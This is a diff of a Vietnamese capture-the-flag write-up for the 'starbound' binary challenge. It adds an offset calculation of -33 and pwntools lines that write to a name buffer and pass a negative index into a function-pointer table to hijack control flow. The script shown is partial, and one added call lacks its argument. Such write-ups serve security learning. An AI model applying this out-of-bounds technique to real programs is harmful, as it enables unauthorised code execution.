@@ -1,4 +1,4 @@
-### Thông tin file:
+<img width="799" height="109" alt="image" src="https://github.com/user-attachments/assets/33f71392-e9cd-4975-b01a-a9f2b3655176" />### Thông tin file:
 
 ```c
 └─$ file starbound
@@ -172,7 +172,7 @@ Trước hết, tính index của `name` (nơi chứa payload)
 
 <img width="427" height="464" alt="image" src="https://github.com/user-attachments/assets/e841de62-59a6-4a55-ba67-ead55b3c2032" />
 
-```
+```c
 # Thấy mỗi function chiếm 4 bytes
 offset = (08058154 - 080580d0) / 4
        = 33
@@ -180,6 +180,32 @@ offset = (08058154 - 080580d0) / 4
 offset = -33
 ```
 
+Để vào option viết vào `name`:
+```
+p.recvuntil(b"> ")
+p.sendline(b"6")
+p.recvuntil(b"> ")
+p.sendline(b"2")
+
+p.sendlineafter(b"Enter your name: ", b"AAAA")
+
+p.recvuntil(b"> ")
+p.sendline(b"1")
+
+p.recvuntil(b"> ")
+p.sendline(b"-33")
+```
+Ta thử xem hướng exploit đúng ko:
+
+* Phần memory tại `name`:  
+
+<img width="799" height="109" alt="image" src="https://github.com/user-attachments/assets/0cfc2ad3-772e-46bb-9e78-155dde1257cf" />
+
+* Với index = `-33`, ta có trỏ đến vùng `name`:
+
+<img width="816" height="692" alt="image" src="https://github.com/user-attachments/assets/8d39853f-bc5b-41d9-acf9-5f51b7f1ddbe" />
+
+==> Có thể khả thi
 ____
 script.py:
 
@@ -199,7 +225,12 @@ p = process(exe.path)
 GDB()
 
 p.recvuntil(b"> ")
-p.sendline(b"3")
+p.sendline(b"6")
+
+p.recvuntil(b"> ")
+p.sendline(b"2")
+
+p.sendlineafter(b"Enter your name: ")
 
 p.interactive()
 ```
